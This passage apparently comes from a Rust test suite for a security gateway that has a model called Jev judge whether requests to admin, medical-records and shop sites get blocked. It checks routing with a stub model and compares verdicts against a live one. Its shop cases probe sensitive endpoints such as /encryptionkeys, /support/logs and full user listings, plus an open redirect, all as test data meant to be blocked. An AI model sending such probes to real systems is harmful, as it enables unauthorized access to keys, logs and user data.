            "adminA GET /api/admin/reports",
            "/api/admin/reports",
            None,
            Some(ADMIN),
            true,
        )
        .observe(),
        get(
            "adminA GET /api/admin/users/export",
            "/api/admin/users/export",
            None,
            Some(ADMIN),
            true,
        )
        .observe(),
    ]
}

/// The shop requests: the probe's shop cases.
fn shop_cases() -> Vec<Case> {
    vec![
        get(
            "shop GET /ftp/acquisitions.md",
            "/ftp/acquisitions.md",
            None,
            Some(SHOPPER),
            true,
        ),
        get(
            "shop GET /encryptionkeys",
            "/encryptionkeys",
            None,
            Some(SHOPPER),
            true,
        ),
        get(
            "shop GET /support/logs",
            "/support/logs",
            None,
            Some(SHOPPER),
            true,
        ),
        get(
            "shop GET /rest/admin/application-version",
            "/rest/admin/application-version",
            None,
            Some(SHOPPER),
            true,
        ),
        get(
            "shop GET /api/Users (all users)",
            "/api/Users",
            None,
            Some(SHOPPER),
            true,
        )
        .known_gap(),
        get(
            "shop GET /redirect?to=",
            "/redirect",
            Some("to=https%3A%2F%2Fexample.org%2Fx"),
            Some(SHOPPER),
            true,
        ),
        get(
            "shop GET /rest/order-history",
            "/rest/order-history",
            None,
            Some(SHOPPER),
            false,
        )
        .known(),
        get(
            "shop GET /api/Deliverys",
            "/api/Deliverys",
            None,
            Some(SHOPPER),
            false,
        ),
        get(
            "shop GET /rest/wallet/balance",
            "/rest/wallet/balance",
            None,
            Some(SHOPPER),
            false,
        ),
        get(
            "shop GET /api/Quantitys",
            "/api/Quantitys",
            None,
            Some(SHOPPER),
            false,
        ),
        post(
            "shop POST /api/Feedbacks",
            "/api/Feedbacks",
            r#"{"comment":"great juice","rating":"5"}"#,
            Some(SHOPPER),
            false,
        ),
        get(
            "shop GET /rest/track-order (own order shown)",
            "/rest/track-order/5267-f73dcd000abcc353",
            None,
            Some(SHOPPER),
            false,
        )
        .seen("5267-f73dcd000abcc353"),
        get(
            "shop GET /assets/i18n/en.json",
            "/assets/i18n/en.json",
            None,
            Some(SHOPPER),
            false,
        ),
    ]
}

/// The requests of one site, in groups of at most [`GROUP_MAX`]. A group starts `start_ms` after the
/// sessions were observed.
struct Group {
    site: Site,
    start_ms: u64,
    cases: Vec<Case>,
}

/// A session may make 60 Jev calls a minute. A group makes at most 20, and the groups of one site start
/// [`GROUP_GAP_MS`] apart, so a minute never holds two groups of one site.
const GROUP_MAX: usize = 20;
const GROUP_GAP_MS: u64 = 120_000;

fn groups() -> Vec<Group> {
    let sites = [
        (Site::Base, base_cases()),
        (Site::Admin, admin_cases()),
        (Site::Role, role_cases()),
        (Site::Shop, shop_cases()),
    ];
    let mut groups = Vec::new();
    for (site, cases) in sites {
        for (index, chunk) in cases.chunks(GROUP_MAX).enumerate() {
            groups.push(Group {
                site,
                start_ms: 2_000 + GROUP_GAP_MS * u64::try_from(index).unwrap_or(0),
                cases: chunk.to_vec(),
            });
        }
    }
    groups
}

/// Observes a successful answer of the origin, which gives the session the value it shows.
fn see<J: JevPort>(
    judge: &Judge<J>,
    site: &SiteSpec,
    credential: &str,
    method: &str,
    path: &str,
    body: &[u8],
    now_ms: u64,
) {
    judge.observe(
        site,
        &Observation {
            route: None,
            request_id: RID,
            unread: None,
            would_block: false,
            credential: Some(credential),
            client: "10.0.0.1",
            issued_credential: None,
            method,
            path,
            status: 200,
            content_type: Some("application/json"),
            body,
            now_ms,
            sent: &[],
            echo: &[],
        },
    );
}

/// Observes the responses that give the sessions of the table their history, the way the origin shows
/// them. The emr sessions see patient 7005 and its notes; the shopper sees its basket and an order.
fn establish<J: JevPort>(judge: &Judge<J>, fixture: &Fixture) {
    for site in [&fixture.base, &fixture.admin] {
        see(
            judge,
            site,
            DOCTOR,
            "GET",
            "/api/home",
            br#"{"doctor":{"id":"DR-A"}}"#,
            1_000,
        );
        see(
            judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients",
            br#"{"patients":[{"id":"7005","name":"Zhang Wei","age":54},{"id":"7008","name":"Li Na","age":31},{"id":"7012","name":"Wang Fang","age":47}]}"#,
            1_001,
        );
        see(
            judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients/7005",
            br#"{"patient":{"id":"7005","name":"Zhang Wei","age":54}}"#,
            1_002,
        );
        see(
            judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients/7005/notes",
            br#"{"notes":[{"id":"n-100","text":"blood pressure stable"}]}"#,
            1_003,
        );
    }
    see(
        judge,
        &fixture.role,
        ADMIN,
        "GET",
        "/api/home",
        br#"{"doctor":{"id":"DR-A"},"role":"admin"}"#,
        1_000,
    );
    let shop = [
        ("/rest/user/whoami", br#"{"user":{"id":6,"email":"shopper@example.test"}}"#.as_slice(), 1_000),
        (
            "/rest/products/search",
            br#"{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99},{"id":2,"name":"Orange Juice (1000ml)","price":2.99}]}"#.as_slice(),
            1_001,
        ),
        (
            "/api/BasketItems",
            br#"{"status":"success","data":[{"id":9,"quantity":1,"BasketId":6,"ProductId":1}]}"#.as_slice(),
            1_002,
        ),
        (
            "/rest/basket/6",
            br#"{"status":"success","data":{"id":6,"coupon":null,"UserId":6,"Products":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99,"BasketItem":{"id":9,"quantity":1,"BasketId":6,"ProductId":1}}]}}"#.as_slice(),
            1_003,
        ),
        (
            "/rest/order-history",
            br#"{"status":"success","data":[{"orderId":"5267-f73dcd000abcc353","totalPrice":1.99}]}"#.as_slice(),
            1_004,
        ),
    ];
    for (path, body, now_ms) in shop {
        see(judge, &fixture.shop, SHOPPER, "GET", path, body, now_ms);
    }
}

/// Judges one request of a site at `now_ms`.
async fn judge_one<J: JevPort>(
    judge: &Judge<J>,
    site: &SiteSpec,
    case: &Case,
    now_ms: u64,
) -> Judgement {
    let request_id = format!("req_{now_ms:032x}");
    judge
        .judge(
            site,
            &RequestFacts {
                route: None,
                request_headers: &[],
                method_overrides: &[],
                request_id: &request_id,
                method: case.method,
                path: case.path,
                query: case.query,
                content_type: (!case.body.is_empty()).then_some("application/json"),
                body: case.body.as_bytes(),
                credential: case.session,
                client: "10.0.0.1",
                now_ms,
            },
        )
        .await
}

/// Judges every request of the table, group by group, in the order of the table.
async fn judge_table<J: JevPort>(judge: &Judge<J>, fixture: &Fixture) -> Vec<(Case, Judgement)> {
    let mut judged = Vec::new();
    for group in groups() {
        for (index, case) in group.cases.iter().enumerate() {
            let now_ms = group.start_ms + u64::try_from(index).unwrap_or(0);
            let judgement = judge_one(judge, fixture.site(group.site), case, now_ms).await;
            judged.push((*case, judgement));
        }
    }
    judged
}

/// The ways a request fails to reach Jev as its case says: the function in the trace and in the state
/// Jev is shown, and, for a value the session has seen, that Jev is shown the value as verified. A request
/// the table knows and the values settle may never reach Jev, and then there is no state to check.
fn reach_problems(case: &Case, judgement: &Judgement) -> Vec<String> {
    let name = case.name;
    let record = &judgement.record;
    let mut problems = Vec::new();
    if judgement.refuse_status == 429 {
        problems.push(format!("{name}: the call limit was spent"));
    }
    if record.decision_path == DecisionPath::JevUnavailable {
        problems.push(format!("{name}: Jev did not answer"));
    }
    let function = record.trace.function.as_ref();
    let traced = match case.function {
        Function::Unknown => function.and_then(|function| function.known) == Some(false),
        Function::Attempt => {
            function.and_then(|function| function.tier.as_deref()) == Some("admin")
                && function.and_then(|function| function.attempt) == Some(Attempt::OverPrivilege)
        }
        Function::None => function.is_none(),
    };
    if !traced {
        problems.push(format!(
            "{name}: the trace does not name the table's function"
        ));
    }
    let Some(jev) = &record.jev else {
        if case.function != Function::None {
            problems.push(format!("{name}: the request did not reach Jev"));
        }
        return problems;
    };
    let Some(text) = jev.state.as_deref() else {
        problems.push(format!("{name}: Jev was called without a state"));
        return problems;
    };
    let state: Value = match serde_json::from_str(text) {
        Ok(state) => state,
        Err(error) => {
            problems.push(format!("{name}: the state is not JSON: {error}"));
            return problems;
        }
    };
    let expected = match case.function {
        Function::Unknown => json!({"known": false}),
        Function::Attempt => json!({"tier": "admin", "attempt": "over_privilege"}),
        Function::None => Value::Null,
    };
    let shown = &state["request"]["function"];
    if *shown != expected {
        problems.push(format!(
            "{name}: Jev is shown {shown}, the table says {expected}"
        ));
    }
    if let Some(value) = case.seen {
        let verified = state["request"]["values"]
            .as_array()
            .into_iter()
            .flatten()
            .any(|entry| entry["value"] == value && entry["verified"] == true);
        if !verified {
            problems.push(format!(
                "{name}: Jev is not shown {value} as verified: {}",
                state["request"]["values"]
            ));
        }
    }
    problems
}

/// The probabilities of a question, option by option, as the record keeps them.
fn probabilities(map: &BTreeMap<String, f64>, options: [&str; 3]) -> String {
    options
        .iter()
        .map(|option| format!("{option} {:.2}", map.get(*option).copied().unwrap_or(0.0)))
        .collect::<Vec<_>>()
        .join(" ")
}

const ACCESS: [&str; 3] = ["ALLOW", "DENY", "UNKNOWN"];
const ATTACK: [&str; 3] = ["BENIGN", "ATTACK", "UNKNOWN"];

/// A model that answers ALLOW and BENIGN to every question, as the engine's own tests fake Jev.
struct Stub;

const STUB_ANSWER: &str = r#"{"model":"stub","answers":{"access":{"type":"choice","choice":"ALLOW","probabilities":{"ALLOW":0.9,"DENY":0.05,"UNKNOWN":0.05}},"attack":{"type":"choice","choice":"BENIGN","probabilities":{"BENIGN":0.9,"ATTACK":0.05,"UNKNOWN":0.05}}}}"#;

#[async_trait]
impl JevPort for Stub {
    fn model(&self) -> String {
        "stub".to_owned()
    }
    fn route(&self) -> String {
        "stub".to_owned()
    }
    fn endpoint(&self) -> String {
        "https://stub.test/v1".to_owned()
    }
    fn endpoint_host(&self) -> String {
        "stub.test".to_owned()
    }
    fn default_timeout(&self) -> Duration {
        TIMEOUT
    }
    async fn ask(&self, _body: Vec<u8>, _timeout: Duration) -> Result<Vec<u8>, JevFailure> {
        Ok(STUB_ANSWER.as_bytes().to_vec())
    }
}

/// Every request of the function table reaches Jev with the function its case names. This runs in CI
/// with a stub model and needs no key: it fails when a case or a site is written wrongly, not when the
/// model changes its mind.
#[tokio::test]
async fn function_cases_reach_jev_as_intended() {
    let fixture = fixture();
    let judge = Judge::new(ContextKey::new(vec![8; 32]), Stub);
    establish(&judge, &fixture);
    let judged = judge_table(&judge, &fixture).await;
    // The plan's shape: 75 requests and 2 recorded ones, 3 known gaps, 4 attempts.
    assert_eq!(
        judged.len(),
        77,
        "the table holds 75 cases and 2 recorded ones"
    );
    assert_eq!(
        judged
            .iter()
            .filter(|(case, _)| case.status == Status::KnownGap)
            .count(),
        3
    );
    assert_eq!(
        judged
            .iter()
            .filter(|(case, _)| case.status == Status::Observe)
            .count(),
        2
    );
    assert_eq!(
        judged
            .iter()
            .filter(|(case, _)| case.function == Function::Attempt)
            .count(),
        4
    );
    let problems: Vec<String> = judged
        .iter()
        .flat_map(|(case, judgement)| reach_problems(case, judgement))
        .collect();
    assert!(
        problems.is_empty(),
        "requests that do not reach Jev as the table says:\n{}",
        problems.join("\n")
    );
}

/// The function table against the live model (docs/04 section 4.4). Every `Must` verdict must match its
/// expectation on each run. A `KnownGap` is printed with the verdict it gets today, and an `Observe` is
/// only printed.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_function_table() {
    let fixture = fixture();
    let judge = Judge::new(
        ContextKey::new(vec![8; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    establish(&judge, &fixture);
    let mut wrong = Vec::new();
    for (case, judgement) in judge_table(&judge, &fixture).await {
        let record = &judgement.record;
        let blocked = !judgement.forward;
        let detail = record.jev.as_ref().map_or_else(
            || "no model call".to_owned(),
            |jev| {
                format!(
                    "{}ms access[{}] attack[{}]",
                    jev.millis,
                    probabilities(&jev.access, ACCESS),
                    probabilities(&jev.attack, ATTACK)
                )
            },
        );
        let status = format!("{:?}", case.status);
        let expected = if case.status == Status::Observe {
            "-".to_owned()
        } else {
            case.expect_block.to_string()
        };
        println!(
            "{:<42} {:<9} blocked={:<5} expected={:<5} {:?}/{:?}  {}",
            case.name, status, blocked, expected, record.decision_path, record.outcome, detail
        );
        assert!(
            record.decision_path != DecisionPath::JevUnavailable
                || record.outcome != Outcome::Unjudged,
            "the live provider must answer"
        );
        match case.status {
            Status::Must if blocked != case.expect_block => {
                if let Some(jev) = &record.jev {
                    println!("  state sent: {}", jev.state.as_deref().unwrap_or("none"));
                }
                wrong.push(case.name);
            }
            Status::KnownGap if blocked == case.expect_block => {
                println!("  now as wanted: {}", case.name);
            }
            _ => {}
        }
    }
    assert!(
        wrong.is_empty(),
        "verdicts differ from the expectation: {wrong:?}"
    );
}
